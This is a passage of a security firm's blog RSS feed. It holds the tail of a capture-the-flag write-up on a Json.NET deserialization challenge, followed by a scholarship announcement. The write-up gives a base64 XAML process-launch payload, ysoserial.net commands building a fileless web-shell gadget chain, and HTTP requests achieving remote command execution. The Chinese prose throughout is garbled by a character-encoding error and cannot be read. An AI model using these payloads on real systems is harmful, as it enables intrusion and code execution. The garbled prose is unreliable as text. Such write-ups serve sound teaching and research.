MDA2L3hhbWwiPg0KICA8T2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KICAgIDxzZDpQcm9jZXNzPg0KICAgICAgPHNkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgICAgICA8c2Q6UHJvY2Vzc1N0YXJ0SW5mbyBBcmd1bWVudHM9Ii9jIGNhbGMiIFN0YW5kYXJkRXJyb3JFbmNvZGluZz0ie3g6TnVsbH0iIFN0YW5kYXJkT3V0cHV0RW5jb2Rpbmc9Int4Ok51bGx9IiBVc2VyTmFtZT0iIiBQYXNzd29yZD0ie3g6TnVsbH0iIERvbWFpbj0iIiBMb2FkVXNlclByb2ZpbGU9IkZhbHNlIiBGaWxlTmFtZT0iY21kIiAvPg0KICAgICAgPC9zZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICA8L3NkOlByb2Nlc3M+DQogIDwvT2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KPC9PYmplY3REYXRhUHJvdmlkZXI+Cw==&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;JsonSerializerSettings&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;JsonSerializerSettings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;TypeNameHandling&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TypeNameHandling&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;All&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;MetadataPropertyHandling&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MetadataPropertyHandling&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ReadAhead&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;JsonConvert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;DeserializeObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;JsonConvert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;SerializeObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å˜—è©¦åŸ·è¡Œä»¥ä¸Šç¨‹å¼ç¢¼å¾Œï¼ŒæˆåŠŸå½ˆå‡ºè¨ˆç®—æ©Ÿï¼
&lt;img src=&quot;/assets/img/blog/20230918/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æ—¢ç„¶é©—è­‰æ­¤è¨­å®šæ˜¯å¯ä»¥ exploit çš„ï¼Œå‰©ä¸‹å°±æ˜¯åŒ…è£ä¸€å€‹æ‡‰ç”¨ç¨‹å¼çš„æƒ…å¢ƒï¼Œè€Œæœ€çµ‚è¶•å‡ºçš„æˆå“å°±æ˜¯ My todolist é€™é“é¡Œç›®ã€‚&lt;/p&gt;

&lt;p&gt;ç†è«–ä¸Šç›´æ¥ä½¿ç”¨ RolePrincipal å°±èƒ½åŸ·è¡Œç³»çµ±æŒ‡ä»¤äº†ï¼Œåªæ˜¯é€™å€‹ exploit åŸ·è¡Œå¾Œä¸æœƒæœ‰ä»»ä½•æŒ‡ä»¤å›é¡¯ï¼Œè€Œæˆ‘å€‘é‚„éœ€è¦å˜—è©¦æ‰¾åˆ°ä¸¦è®€å– flagï¼Œç‚ºäº†å¾ŒçºŒæ›´ä¾¿åˆ©æ“ä½œï¼Œæˆ‘å€‘å¯ä»¥å˜—è©¦å°‡æ¼æ´è½‰æ›æˆ web shellï¼Œè©³ç´°å¯ä»¥åƒè€ƒæˆ‘çš„å¦ä¸€ç¯‡æ–‡ç« ã€Œ&lt;a href=&quot;https://devco.re/blog/2020/03/11/play-with-dotnet-viewstate-exploit-and-create-fileless-webshell/&quot;&gt;ç©è½‰ ASP.NET VIEWSTATE ååºåˆ—åŒ–æ”»æ“Šã€å»ºç«‹ç„¡æª”æ¡ˆå¾Œé–€ï¼&lt;/a&gt;ã€ï¼Œä½†é€™å€‹æ–¹æ³•çš„ gadget æ˜¯éœ€è¦ä½¿ç”¨ BinaryFormatter åŸ·è¡Œ OnDeserialization callback é€²è€Œè§¸ç™¼ gadget chain çš„åŸ·è¡Œï¼Œä½†å¦‚æœä½ æœ‰ clone æœ€æ–°ç‰ˆæœ¬çš„ ysoserial.net ä¾†è‡ªè¡Œç·¨è­¯çš„è©±ï¼Œæœƒç™¼ç¾ help è¨Šæ¯ä¸­å¤šäº†ä¸€å€‹æ–°çš„åƒæ•¸ â€“bgcã€‚&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;--bgc, --bridgedgadgetchains=VALUE
    Chain of bridged gadgets separated by comma (,). 
      Each gadget will be used to complete the next 
      bridge gadget. The last one will be used in the 
      requested gadget. This will be ignored when 
      using the searchformatter argument.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;æ²’éŒ¯ï¼Œç‚ºé€™å€‹å°ˆæ¡ˆè²¢ç»çš„ç ”ç©¶è€…å€‘æˆåŠŸæ‰¾åˆ° gadget chain å¯¦ç¾å°‡ Json.NET ç­‰éœ€è¦ setter é¡å‹çš„ gadget çš„ formatter è½‰æ›æˆ BinaryFormatter çš„äºŒæ¬¡ååºåˆ—åŒ–ï¼Œå¾è€Œå¯ä»¥åŸ·è¡Œæ›´å¤šçš„ gadgetï¼Œå…¶ä¸­ç•¶ç„¶å°±åŒ…æ‹¬  ActivitySurrogateDisableTypeCheck å’Œ ActivitySurrogateSelectorFromFile é€™å…©å€‹æœ€é‡è¦çš„ gadgetï¼Œæˆ‘å€‘ä¹Ÿå› æ­¤å¯ä»¥å†æ¬¡ä½¿ç”¨é€™å€‹åŠŸèƒ½å¯¦ç¾ååºåˆ—åŒ–æ”»æ“Šåˆ° fileless webshell çš„ exploitï¼
ç”¢ç”Ÿ payload çš„æŒ‡ä»¤ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-!&quot;&gt;ysoserial.exe -g RolePrincipal -f Json.Net --bgc ActivitySurrogateDisableTypeCheck -c 1

ysoserial.exe -g RolePrincipal -f Json.Net --bgc ActivitySurrogateSelectorFromFile -c &quot;.\ExploitClass.cs;dlls\System.dll;dlls\System.Web.dll&quot;

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;æœ€å¾Œé¡Œç›®åªè¦åœ¨æ­£å¸¸è¨»å†Šå¾Œéš¨ä¾¿æ–°å¢ä¸€å€‹ note é€²è¡Œä¿®æ”¹ï¼Œå†åˆ†åˆ¥å°å…©å€‹ payload åŸ·è¡Œä¸€æ¬¡é¡ä¼¼ä¸‹é¢çš„è«‹æ±‚ï¼Œå°±å¯ä»¥é”æˆæœ‰å›é¡¯çš„ RCE äº†ï¼&lt;/p&gt;

&lt;p&gt;Request 1:&lt;/p&gt;
&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;POST&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;/Api/UpdateTodo&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;localhost:8003&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Content-Type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;application/x-www-form-urlencoded&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Content-Length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;xx&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;lt;session&amp;gt;&lt;/span&gt;

uuid=00c3abe9-1f7c-4cda-8c24-60c59ac01f3f&amp;amp;field=$type&amp;amp;value=System.Web.Security.RolePrincipal,+System.Web,+Version%3d4.0.0.0,+Culture%3dneutral,+PublicKeyToken%3db03f5f7f11d50a3a
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Request 2:&lt;/p&gt;
&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;POST&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;/Api/UpdateTodo&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;localhost:8003&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Content-Type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;application/x-www-form-urlencoded&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Content-Length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;xx&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;lt;session&amp;gt;&lt;/span&gt;

uuid=00c3abe9-1f7c-4cda-8c24-60c59ac01f3f&amp;amp;field=System.Security.ClaimsPrincipal.Identities&amp;amp;value=&amp;lt;payload&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Request 3:&lt;/p&gt;
&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;POST&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;/Api/MyProfile&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;localhost:8003&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Content-Type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;application/x-www-form-urlencoded&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Content-Length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;10&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;lt;session&amp;gt;&lt;/span&gt;

cmd=whoami
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

</description>
                <link>https://devco.re/blog/2023/09/18/hitcon-2023-devcore-wargame-my-todolist-writeup/</link>
                <guid>https://devco.re/blog/2023/09/18/hitcon-2023-devcore-wargame-my-todolist-writeup</guid>
                <pubDate>Mon, 18 Sep 2023 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>è¦–äººæ‰åŸ¹è‚²ç‚ºå·±ä»»ã€€DEVCORE å…¨åœ‹è³‡è¨Šå®‰å…¨çå­¸é‡‘ã€è³‡å®‰æ•™è‚²æ´»å‹•è´ŠåŠ©è¨ˆç•«å³æ—¥èµ·é–‹æ”¾å ±å</title>
                <description>&lt;p&gt;DEVCORE ä»Šï¼ˆ30ï¼‰æ—¥ç”«æ–¼è¼”ä»å¤§å­¸èˆ‰è¾¦ã€Œæˆ´å¤«å¯‡çˆ¾è³‡è¨Šå®‰å…¨çå­¸é‡‘ã€2023 å¹´åº¦é ’çå…¸ç¦®ï¼Œå…±æœ‰ 3 ä½è³‡å·¥ç³»åŒå­¸ç²çã€‚åŒä¸€æ™‚é–“ï¼Œæˆ‘å€‘å¾ˆé«˜èˆˆåœ°å®£ä½ˆï¼Œä»Šå¹´åº¦æˆ‘å€‘ä¹Ÿå°‡çºŒè¾¦ã€Œå…¨åœ‹è³‡è¨Šå®‰å…¨çå­¸é‡‘ã€åŠã€Œè³‡å®‰æ•™è‚²æ´»å‹•è´ŠåŠ©è¨ˆç•«ã€ï¼Œå³æ—¥èµ·é–‹æ”¾å ±åï¼&lt;/p&gt;

&lt;p&gt;è¿‘å¹´ä¾†ï¼Œç„¡è«–æ˜¯æ”¿åºœæˆ–ä¼æ¥­ï¼Œåœ¨æ•¸ä½æµªæ½®åŠé›²ä¸–ä»£çš„æ¨æ³¢åŠ©ç€¾ä¸‹ï¼Œç„¡ä¸é–‹å§‹æ­£è¦–è³‡å®‰äººæ‰è’çš„å›°å¢ƒã€‚è‡ª 2012 å¹´å‰µç«‹ä¹‹åˆï¼ŒDEVCORE å³ç§‰æŒè‘—æå‡å°ç£è³‡å®‰ç«¶çˆ­åŠ›ã€è®“ä¸–ç•Œæ›´å®‰å…¨çš„åˆè¡·ï¼Œå°‡äººæ‰åŸ¹è‚²è¦–ç‚ºå·±ä»»ï¼Œé€éåƒèˆ‡æ•™è‚²éƒ¨è³‡å®‰äººæ‰åŸ¹è‚²è¨ˆç•«ã€å‰µè¾¦ DEVCORE å¯¦ç¿’ç”Ÿè¨ˆç•«ã€å•Ÿå‹•æˆ´å¤«å¯‡çˆ¾è³‡å®‰çå­¸é‡‘ã€è¾¦ç†è³‡å®‰æ•™è‚²æ´»å‹•è´ŠåŠ©è¨ˆç•«ç­‰æ–¹å¼ï¼Œå”åŠ©è³‡å®‰äººæ‰èŒå£¯æˆé•·ã€‚&lt;/p&gt;

&lt;h3 id=&quot;devcore-å…¨åœ‹è³‡è¨Šå®‰å…¨çå­¸é‡‘&quot;&gt;DEVCORE å…¨åœ‹è³‡è¨Šå®‰å…¨çå­¸é‡‘&lt;/h3&gt;

&lt;p&gt;æˆ´å¤«å¯‡çˆ¾è³‡å®‰çå­¸é‡‘æ–¼ 2020 å¹´é¦–æ¬¡é ’ç™¼ï¼ŒåŸç‚ºæ„Ÿå¿µéå»åœ¨å­¸ç”Ÿæ™‚ä»£æ™‚å—åˆ°çš„å„æ–¹è³‡æºåŠé¼“å‹µï¼Œçå­¸é‡‘é ’ç™¼ç¯„åœç‚ºç¶“ç‡Ÿåœ˜éšŠæ¯æ ¡çš„è¼”ä»å¤§å­¸åŠåœ‹ç«‹è‡ºç£ç§‘æŠ€å¤§å­¸ï¼Œå¾Œç‚ºåŸ¹è‚²æ›´å¤šæœ‰å¿—æ–¼æ­¤çš„é’å¹´å­¸å­ï¼Œæˆ‘å€‘æ–¼å»å¹´æ“´å¤§çå­¸é‡‘ç¯„åœï¼Œé–‹æ”¾å…¨åœ‹å„åœ°çš„è³‡å®‰æ–°éŠ³å ±åç”³è«‹ï¼ŒæœŸå¾…èƒ½æ¨å»£ã€Œé§­å®¢æ€ç¶­ã€ã€å¼·åŒ–è³‡å®‰æŠ€èƒ½ï¼Œä¸¦å¹«åŠ©åœ¨å­¸å­¸ç”Ÿäº†è§£è³‡å®‰ç”¢æ¥­ç”Ÿæ…‹åŠç¾æ³ã€é™ä½å­¸ç”¨è½å·®ï¼Œæœªä¾†æˆç‚ºæ–°ä¸€ä»£çš„æ”»æ“Šå‹è³‡å®‰äººæ‰ï¼Œç‚ºè³‡å®‰ç”¢æ¥­æ³¨å…¥æ–°æ´»åŠ›ã€‚&lt;/p&gt;

&lt;p&gt;ã€Œæˆ´å¤«å¯‡çˆ¾å…¨åœ‹è³‡è¨Šå®‰å…¨çå­¸é‡‘ã€æ­¡è¿æ‰€æœ‰åœ¨è³‡è¨Šå®‰å…¨é ˜åŸŸæœ‰å‡ºçœ¾ç ”ç©¶æˆæœçš„å­¸ç”Ÿå ±åç”³è«‹ï¼Œæœ‰æ„ç”³è«‹è€…é ˆæå‡ºå­¸ç¿’è³‡å®‰çš„å‹•æ©Ÿèˆ‡æ­·ç¨‹ï¼Œä¸¦ç¹³äº¤è³‡å®‰ç ”ç©¶æˆ–æ¯”è³½æˆæœï¼Œæˆ‘å€‘å°‡å¾ä¸­æ“‡å„ªé¸å– 10 åï¼Œç²é¸è€…å¯ç²æœ€é«˜ 2 è¬å…ƒçš„ç ”ç©¶è£œåŠ©ã€‚è©³ç´°ç”³è«‹è¾¦æ³•å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ç”³è«‹è³‡æ ¼ï¼šå…¨åœ‹å„å¤§å°ˆé™¢æ ¡å­¸ç”Ÿçš†å¯ä»¥ç”³è«‹ã€‚&lt;/li&gt;
  &lt;li&gt;çå­¸é‡‘é‡‘é¡/åé¡ï¼šæ¯å¹´åº¦å– 10 åï¼Œæ¯åå¯ç²å¾—çå­¸é‡‘æ–°å°å¹£ 20,000 å…ƒæ•´ï¼Œå…±è¨ˆ 20 è¬å…ƒã€‚å¦‚å ±åè¸´èºæˆ‘å€‘å°‡è¦–ç”³è«‹ç‹€æ³å¢åŠ åé¡ã€‚&lt;/li&gt;
  &lt;li&gt;ç”³è«‹æ™‚ç¨‹ï¼š
    &lt;ul&gt;
      &lt;li&gt;2023/8/30 å®˜ç¶²å…¬å‘Šçå­¸é‡‘è¨ˆç•«è³‡è¨Š&lt;/li&gt;
      &lt;li&gt;2023/8/31 - 2023/9/30 é–‹æ”¾æ”¶ä»¶&lt;/li&gt;
      &lt;li&gt;2023/10/31 å…¬å¸ƒå¯©æŸ¥çµæœï¼Œä¸¦å°‡æ–¼ 11 è‡³ 12 æœˆé–“é ’ç™¼çå­¸é‡‘&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ç”³è«‹è¾¦æ³•ï¼š
    &lt;ul&gt;
      &lt;li&gt;è«‹ä¾â½‚ä»¶æª¢æ ¸è¡¨é …æ¬¡é †åºæ’åˆ—å·²é™„â½‚ä»¶ï¼Œå½™æ•´ç‚ºâ¼€ä»½ PDF æª”æ¡ˆï¼Œå¯„â¾„ scholarship@devco.reã€‚&lt;/li&gt;
      &lt;li&gt;ä¿¡ä»¶ä¸»æ—¨åŠ PDF æª”æ¡ˆåç¨±è«‹ç¬¦åˆä»¥ä¸‹æ ¼å¼ï¼š[å…¨åœ‹çå­¸â¾¦ç”³è«‹] å­¸æ ¡åç¨±_å­¸è™Ÿ_å§“åï¼ˆç¯„ä¾‹ï¼š[å…¨åœ‹çå­¸â¾¦ç”³è«‹] è¼”ä»â¼¤å­¸_B11100000_ç‹â¼©ç¾ï¼‰ã€‚&lt;/li&gt;
      &lt;li&gt;è«‹ç”³è«‹â¼ˆâ¾ƒæˆ‘æª¢æ ¸ä¸¦æ–¼ç”³è«‹â¼ˆæª¢æ ¸å€å‹¾é¸å·²é™„â½‚ä»¶ï¼Œè‹¥â½‚ä»¶ä¸â¿‘æˆ–æœªç¢ºå¯¦å‹¾é¸æ•ä¸å—ç†ç”³è«‹ã€‚&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;é ˆæª¢é™„æ–‡ä»¶ï¼š
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;/assets/files/scholarship/æˆ´å¤«å¯‡çˆ¾å…¨åœ‹çå­¸é‡‘ç”³è«‹è¡¨.pdf&quot;&gt;æœ¬çå­¸â¾¦ç”³è«‹è¡¨&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;åœ¨å­¸è­‰æ˜&lt;/li&gt;
      &lt;li&gt;æœ€è¿‘â¼€å­¸æœŸæˆç¸¾å–®&lt;/li&gt;
      &lt;li&gt;å­¸ç¿’è³‡è¨Šå®‰å…¨ä¹‹å‹•æ©Ÿèˆ‡æ­·ç¨‹â¼¼å¾—â¼€ç¯‡ï¼šå­—æ•¸ 500 - 2000 å­—&lt;/li&gt;
      &lt;li&gt;è³‡è¨Šå®‰å…¨æŠ€è¡“ç›¸é—œç ”ç©¶æˆæœï¼šè‡³å°‘é ˆå¾ä»¥ä¸‹å…­é …ç›®ä¸­æ“‡ä¸€ç¹³äº¤ï¼ŒåŒ…å«ç ”è¨æœƒæŠ•ç¨¿çµæœã€æ¼æ´çå‹µè¨ˆç•«æˆæœã€å¼±é»ç ”ç©¶æˆæœã€è³‡è¨Šå®‰å…¨æ¯”è³½æˆæœã€è³‡å®‰å·¥å…·ç ”ç©¶æˆæœã€æŠ€è¡“æ–‡ç« ç™¼è¡¨æˆæœç­‰&lt;/li&gt;
      &lt;li&gt;ç¤¾ç¾¤ç¶“ç‡Ÿæˆæœï¼šè‡³å°‘é ˆå¾ä»¥ä¸‹å…©é …ç›®ä¸­æ“‡ä¸€ç¹³äº¤ï¼ŒåŒ…å«æ ¡åœ’è³‡å®‰ç¤¾åœ˜ã€å…¬é–‹è³‡å®‰ç¤¾ç¾¤ç­‰&lt;/li&gt;
      &lt;li&gt;æ¨è–¦å‡½ï¼šå°å¸«ã€ç³»ä¸»ä»»ã€å…¶ä»–æ•™æˆæˆ–æ¥­ç•Œâ¼ˆâ¼ æ¨è–¦å‡½ï¼Œâ¾„å°‘é ˆå–å¾—å…©å°ä»¥ä¸Šæ¨è–¦å‡½&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;devcore-è³‡å®‰æ•™è‚²æ´»å‹•è´ŠåŠ©è¨ˆåŠƒ&quot;&gt;DEVCORE è³‡å®‰æ•™è‚²æ´»å‹•è´ŠåŠ©è¨ˆåŠƒ&lt;/h3&gt;
&lt;p&gt;å–ä¹‹æ–¼ç¤¾æœƒï¼Œç”¨ä¹‹æ–¼ç¤¾æœƒã€‚DEVCORE å‰µç«‹è‡³ä»Šå·²æº–å‚™é‚å…¥ç¬¬ 11 å¹´ï¼Œæˆ‘å€‘æœŸå¾…èƒ½ä»¥ä¸åŒçš„æ–¹å¼åŠ æ·±æ ¡åœ’èˆ‡ç”¢æ¥­çš„é€£çµï¼Œæ¨å»£æ­£ç¢ºçš„è³‡å®‰æ„è­˜åŠé§­å®¢æ€ç¶­ï¼Œå”åŠ©å°ç£è³‡å®‰äººæ‰æˆé•·èŒå£¯ã€‚&lt;/p&gt;

&lt;p&gt;ä»Šå¹´æˆ‘å€‘ä¹Ÿå°‡æŒçºŒè´ŠåŠ©è³‡å®‰æ•™è‚²æ´»å‹•ï¼Œæä¾›ç¶“è²»äºˆè³‡å®‰ç›¸é—œä¹‹ç¤¾ç¾¤ã€ç¤¾åœ˜è¾¦ç†å„é …æ´»å‹•ï¼Œå‡èšå°ç£è³‡å®‰ç¤¾ç¾¤ï¼ŒåŠ é€ŸåŸ¹è‚²å°ç£çš„è³‡å®‰æ–°éŠ³ã€‚&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ç”³è«‹è³‡æ ¼ï¼šèˆ‡è³‡å®‰è­°é¡Œç›¸é—œä¹‹ç¤¾ç¾¤ã€ç¤¾åœ˜æ´»å‹•ï¼Œè«‹ç”± 1 ä½ç¤¾åœ˜ä»£è¡¨äººå¡«å¯«è³‡æ–™ã€‚&lt;/li&gt;
  &lt;li&gt;è´ŠåŠ©é‡‘é¡ï¼šä¾å„ç¤¾åœ˜æ´»å‹•éœ€æ±‚åŠèˆ‡æˆ´å¤«å¯‡çˆ¾è¨è«–è€Œå®šï¼Œæ¯æ¬¡æœ€é«˜è£œåŠ©é‡‘é¡ç‚ºæ–°å°å¹£ 20,000 å…ƒæ•´ã€‚&lt;/li&gt;
  &lt;li&gt;ç”³è«‹æ™‚ç¨‹ï¼šå¦‚æ¬²ç”³è«‹æ­¤è¨ˆç•«çš„ç¤¾åœ˜æˆ–æ´»å‹•ï¼Œè«‹æ–¼ 2023/10/31 å‰é€éä»¥ä¸‹é€£çµå¡«å¯«åˆæ­¥è³‡æ–™ï¼Œæˆ‘å€‘æœƒåœ¨ 30 æ—¥å…§é€šçŸ¥ç¬¦åˆç”³è«‹è³‡æ ¼è€…æä¾›é€²ä¸€æ­¥è³‡æ–™ï¼Œä¸ç¬¦åˆè³‡æ ¼è€…å°‡ä¸å¦è¡Œé€šçŸ¥ã€‚&lt;/li&gt;
  &lt;li&gt;ç”³è«‹é€£çµï¼š&lt;a href=&quot;https://forms.gle/dW3GcGjw5z8WQ9pV9&quot; target=&quot;_blank&quot;&gt;DEVCORE 2023 å¹´è³‡å®‰æ•™è‚²æ´»å‹•è´ŠåŠ©èª¿æŸ¥&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;é ˆæä¾›è³‡æ–™ï¼š
    &lt;ul&gt;
      &lt;li&gt;ç”³è«‹è³‡æ ¼ï¼šç”³è«‹äººéœ€ä»¥å„è³‡å®‰ç¤¾ç¾¤æˆ–ç¤¾åœ˜åç¾©æå‡ºç”³è«‹ã€‚&lt;/li&gt;
      &lt;li&gt;è¯çµ¡é›»å­éƒµä»¶&lt;/li&gt;
      &lt;li&gt;æƒ³è¦è¾¦ç†çš„æ´»å‹•é¡å‹&lt;/li&gt;
      &lt;li&gt;æƒ³è¦è¾¦ç†çš„æ´»å‹•æ–¹å¼&lt;/li&gt;
      &lt;li&gt;æ´»å‹•ç¸½é ç®—&lt;/li&gt;
      &lt;li&gt;é è¨ˆéœ€è¦è´ŠåŠ©é‡‘é¡&lt;/li&gt;
      &lt;li&gt;ä»£è¡¨äººå§“åã€é€£çµ¡é›»è©±&lt;/li&gt;
      &lt;li&gt;åœ˜é«”åç¨±&lt;/li&gt;
      &lt;li&gt;åœ˜é«”å–®ä½ç¶²å€&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;æ³¨æ„äº‹é …ï¼š
    &lt;ul&gt;
      &lt;li&gt;ç”³è«‹æ¡ˆå¯©æ ¸å°‡ç¶“éæˆ´å¤«å¯‡çˆ¾å…§éƒ¨å¯©æ ¸æ©Ÿåˆ¶ï¼Œä¸¦ä¿æœ‰æœ€çµ‚æ ¸æ±ºæ¬Šã€‚&lt;/li&gt;
      &lt;li&gt;æœ¬å•å·åƒ…ä¾›åˆæ­¥æ„é¡˜è’é›†ç”¨é€”ï¼Œç¬¦åˆç”³è«‹è³‡æ ¼è€…ï¼Œæˆ´å¤«å¯‡çˆ¾å°‡æ–¼ 30 æ—¥å…§é€šçŸ¥æä¾›é€²ä¸€æ­¥è³‡æ–™ä¾›å¯©æ ¸ï¼Œå…¶é¤˜å°‡ä¸å¦è¡Œé€šçŸ¥ã€‚&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;
</description>
                <link>https://devco.re/blog/2023/08/30/2023-devcore-cybersecurity-scholarship-application-opens/</link>
                <guid>https://devco.re/blog/2023/08/30/2023-devcore-cybersecurity-scholarship-application-opens</guid>
                <pubDate>Wed, 30 Aug 2023 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>DEVCORE 2023 ç¬¬å››å±†å¯¦ç¿’ç”Ÿè¨ˆç•«</title>
